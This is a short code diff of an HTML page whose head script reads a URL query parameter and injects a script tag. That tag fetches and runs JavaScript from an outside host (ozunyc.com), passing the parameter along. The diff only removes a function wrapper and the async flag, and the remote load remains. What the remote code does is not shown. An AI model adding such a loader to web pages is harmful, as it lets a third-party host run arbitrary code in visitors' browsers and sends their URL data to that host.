@@ -2,18 +2,16 @@
 <html>
 <head>
 	<script>
-		(function() {
-			var url = new URL(window.location.href);
-			var x = url.searchParams.get("x");
-			console.log(x);
+		var url = new URL(window.location.href);
+		var x = url.searchParams.get("x");
+		console.log(x);
 
-			if(x)
-			{
-				var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-		        hs.src = (`https://ozunyc.com/api?x=${encodeURIComponent(x)}`);
-		        document.getElementsByTagName('head')[0].appendChild(hs);
-			}
-	    })();
+		if(x)
+		{
+			var hs = document.createElement('script'); hs.type = 'text/javascript';
+	        hs.src = (`https://ozunyc.com/api?x=${encodeURIComponent(x)}`);
+	        document.getElementsByTagName('head')[0].appendChild(hs);
+		}
 	</script>
 </head>
 <body>
